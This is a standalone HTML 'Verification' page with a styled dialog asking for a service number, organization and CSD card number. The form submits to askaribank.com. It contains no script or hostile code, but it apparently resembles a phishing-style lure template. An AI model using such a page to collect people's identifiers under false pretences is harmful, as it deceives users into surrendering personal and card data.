<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f7f7f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .dialog-box {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 400px;
            text-align: center;
            position: relative;
        }

        h2 {
            color: #004a8e;
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ccc;
            font-size: 16px;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #004a8e;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
        }

        .cross-button {
            position: absolute;
            top: 10px;
            right: 10px;
            font-size: 20px;
            color: #000;
            background: none;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="dialog-box">
        <button class="cross-button" onclick="window.location.href='https://askaribank.com/'">×</button>
        <h2>Verification Details</h2>
        <form action="https://askaribank.com/" method="GET">
            <input type="text" name="service_number" placeholder="Service Number" required>
            <input type="text" name="organization" placeholder="Organization" required>
            <input type="text" name="csd_card_number" placeholder="CSD Card Number" required>
            <button type="submit">Verify</button>
        </form>
    </div>
</body>
</html>
